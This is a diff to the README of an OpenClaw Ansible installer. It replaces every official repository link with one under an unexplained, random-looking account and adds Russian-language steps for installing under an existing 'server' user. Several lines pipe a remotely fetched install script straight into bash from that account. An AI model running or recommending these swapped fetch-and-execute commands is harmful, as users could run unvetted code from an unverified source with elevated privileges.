@@ -1,7 +1,7 @@
 # OpenClaw Ansible Installer
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Lint](https://github.com/openclaw/openclaw-ansible/actions/workflows/lint.yml/badge.svg)](https://github.com/openclaw/openclaw-ansible/actions/workflows/lint.yml)
+[![Lint](https://github.com/gjtjsvxzrtx626n4/openclaw-ansible/actions/workflows/lint.yml/badge.svg)](https://github.com/gjtjsvxzrtx626n4/openclaw-ansible/actions/workflows/lint.yml)
 [![Ansible](https://img.shields.io/badge/Ansible-2.14+-blue.svg)](https://www.ansible.com/)
 [![Multi-OS](https://img.shields.io/badge/OS-Debian%20%7C%20Ubuntu-orange.svg)](https://www.debian.org/)
 
@@ -37,7 +37,14 @@ The underlying project currently requires system-level permissions and configura
 Install the latest stable version from npm:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/openclaw/openclaw-ansible/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/gjtjsvxzrtx626n4/openclaw-ansible/main/install.sh | bash
+```
+
+Установить под существующего пользователя `server` вместо пользователя `openclaw` по умолчанию:
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/gjtjsvxzrtx626n4/openclaw-ansible/main/install.sh | \
+  bash -s -- -e openclaw_user=server
 ```
 
 ### Development Mode
@@ -46,7 +53,7 @@ Install from source for development or testing:
 
 ```bash
 # Clone the installer
-git clone https://github.com/openclaw/openclaw-ansible.git
+git clone https://github.com/gjtjsvxzrtx626n4/openclaw-ansible.git
 cd openclaw-ansible
 
 # Install in development mode
@@ -64,10 +71,16 @@ cd openclaw-ansible
 
 ## Post-Install
 
-After installation completes, switch to the openclaw user:
+После установки переключитесь на выбранного пользователя OpenClaw:
 
 ```bash
 sudo su - openclaw
+```
+
+Если установка запускалась с `-e openclaw_user=server`, используйте:
+
+```bash
+sudo su - server
 ```
 
 Then run the quick-start onboarding wizard:
@@ -111,7 +124,7 @@ openclaw logs
 sudo apt update && sudo apt install -y ansible git
 
 # Clone repository
-git clone https://github.com/openclaw/openclaw-ansible.git
+git clone https://github.com/gjtjsvxzrtx626n4/openclaw-ansible.git
 cd openclaw-ansible
 
 # Install Ansible collections
@@ -144,14 +157,14 @@ This will:
 `openclaw.installer` is an Ansible collection and can be installed with the `ansible-galaxy` command:
 
 ```bash
-ansible-galaxy collection install git+https://github.com/openclaw/openclaw-ansible.git
+ansible-galaxy collection install git+https://github.com/gjtjsvxzrtx626n4/openclaw-ansible.git
 ```
 
 Alternatively, add it to the [`requirements.yml` file of your Ansible project](https://docs.ansible.com/ansible/latest/collections_guide/collections_installing.html#install-multiple-collections-with-a-requirements-file) as follows:
 
 ```yaml
 collections:
-  - name: https://github.com/openclaw/openclaw-ansible.git
+  - name: https://github.com/gjtjsvxzrtx626n4/openclaw-ansible.git
     type: git
     version: main
 ```
@@ -256,7 +269,7 @@ Verify: `nmap -p- YOUR_SERVER_IP` should show only port 22 open.
 For high-security environments, audit before running:
 
 ```bash
-git clone https://github.com/openclaw/openclaw-ansible.git
+git clone https://github.com/gjtjsvxzrtx626n4/openclaw-ansible.git
 cd openclaw-ansible
 # Review playbook.yml and roles/
 ansible-playbook playbook.yml --check --diff  # Dry run
@@ -292,6 +305,12 @@ ansible-playbook playbook.yml --ask-become-pass \
   -e "openclaw_ssh_keys=['ssh-ed25519 AAAAC3... user@host']"
 ```
 
+Чтобы установить OpenClaw под существующую учётную запись `server`:
+
+```bash
+ansible-playbook playbook.yml --ask-become-pass -e openclaw_user=server
+```
+
 ### 2. Via Variables File
 
 ```bash
@@ -319,7 +338,7 @@ Edit `roles/openclaw/defaults/main.yml` before running the playbook.
 | Variable | Default | Description |
 |----------|---------|-------------|
 | `openclaw_user` | `openclaw` | System user name |
-| `openclaw_home` | `/home/openclaw` | User home directory |
+| `openclaw_home` | Домашний каталог существующего пользователя или `/home/{{ openclaw_user }}` | Домашний каталог пользователя |
 | `openclaw_install_mode` | `release` | `release` or `development` |
 | `openclaw_ssh_keys` | `[]` | List of SSH public keys |
 | `openclaw_repo_url` | `https://github.com/openclaw/openclaw.git` | Git repository (dev mode) |
@@ -361,4 +380,4 @@ MIT - see [LICENSE](LICENSE)
 ## Support
 
 - OpenClaw: https://github.com/openclaw/openclaw
-- This installer: https://github.com/openclaw/openclaw-ansible/issues
+- This installer: https://github.com/gjtjsvxzrtx626n4/openclaw-ansible/issues
